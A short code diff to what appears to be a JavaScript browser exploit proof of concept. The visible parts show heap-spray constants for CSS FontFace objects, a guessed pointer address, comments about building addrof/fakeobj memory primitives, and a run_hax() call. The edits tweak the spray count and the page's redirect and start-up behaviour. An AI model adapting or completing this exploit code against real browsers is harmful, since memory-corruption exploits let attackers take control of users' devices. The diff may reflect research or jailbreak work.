@@ -2,7 +2,7 @@ var PAGE_SIZE = 16384;
 var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
 var STRING_OFFSET = 20;
-var SPRAY_FONTS = 0x1000;
+var SPRAY_FONTS = 0x100a;
 var GUESS_FONT = 0x200430000;
 var NPAGES = 20;
 var INVALID_POINTER = 0;
@@ -217,6 +217,7 @@ function poc() {
 
     var structureid_low = union_i[0];
     var structureid_high = union_i[1];
+    window.msgs.innerHTML="";
 
     //setup for addrof/fakeobj
     //in array[256] butterfly: 0 = &bad_fonts[guessed_font+12] as double
@@ -367,8 +368,8 @@ function poc() {
     };
     window.p = prim;
     run_hax();
-    // window.location.href='./index.html';
+    // window.location.href='.';
 
 
 }
-once();
+// once();
